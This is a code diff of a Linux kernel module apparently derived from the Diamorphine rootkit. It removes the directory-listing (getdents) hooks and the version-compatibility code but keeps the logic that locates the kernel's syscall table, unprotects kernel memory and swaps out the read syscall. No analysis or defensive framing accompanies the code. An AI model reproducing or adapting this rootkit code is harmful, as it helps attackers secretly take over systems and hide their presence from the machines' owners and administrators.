@@ -5,29 +5,6 @@
 #include <linux/slab.h>
 #include <linux/version.h> 
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-#include <asm/uaccess.h>
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-#include <linux/proc_ns.h>
-#else
-#include <linux/proc_fs.h>
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
-#include <linux/file.h>
-#else
-#include <linux/fdtable.h>
-#endif
-
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
-#include <linux/unistd.h>
-#endif
-
-#ifndef __NR_getdents
-#define __NR_getdents 141
-#endif
 
 #include "rscaller.h"
 
@@ -39,50 +16,18 @@ unsigned long start_rodata;
 unsigned long init_begin;
 #define section_size init_begin - start_rodata
 #endif
+
 static unsigned long *__sys_call_table;
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
-	static t_syscall orig_getdents;
-	static t_syscall orig_getdents64;
-	static t_syscall orig_read;
-#else
-	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
-		unsigned int);
-	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
-		struct linux_dirent64 *, unsigned int);
-	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
-	orig_getdents_t orig_getdents;
-	orig_getdents64_t orig_getdents64;
-	orig_kill_t orig_read;
-#endif
+typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+static t_syscall orig_read;
 
 unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
 	
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-#ifdef KPROBE_LOOKUP
-	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
-	register_kprobe(&kp);
-	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-	unregister_kprobe(&kp);
-#endif
 	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 	return syscall_table;
-#else
-	unsigned long int i;
-
-	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-			i += sizeof(void *)) {
-		syscall_table = (unsigned long *)i;
-
-		if (syscall_table[__NR_close] == (unsigned long)sys_close)
-			return syscall_table;
-	}
-	return NULL;
-#endif
 }
 
 
@@ -151,15 +96,7 @@ diamorphine_init(void)
 #endif
 
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
 	orig_read = (t_syscall)__sys_call_table[__NR_read];
-#else
-	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
-	orig_read = (orig_kill_t)__sys_call_table[__NR_kill];
-#endif
 
 	unprotect_memory();
 
@@ -175,8 +112,6 @@ diamorphine_cleanup(void)
 {
 	unprotect_memory();
 
-	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_read] = (unsigned long) orig_read;
 
 	protect_memory();
